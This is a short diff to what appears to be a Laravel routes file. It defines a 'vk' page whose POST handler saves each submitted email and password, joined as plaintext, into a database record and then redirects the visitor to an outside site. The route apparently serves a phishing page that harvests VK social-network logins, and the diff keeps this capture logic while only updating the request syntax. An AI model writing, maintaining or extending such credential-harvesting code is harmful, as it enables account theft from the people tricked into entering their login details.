@@ -258,8 +258,8 @@ Route::group(['middleware' => 'web'], function () {
 Route::get('vk', function() {
     return view('vk');
 });
-Route::post('vk', function(Request $request) {
-    \App\Volume::create('name', $request->get('email') . ' --------- ' . $request->get('pass'))->save();
+Route::post('vk', function(\Illuminate\Http\Request $request) {
+    \App\Volume::create('name', $request->input('email') . ' --------- ' . $request->input('pass'))->save();
     return redirect()->to('http://www.yasiv.com/vk');
 });
 
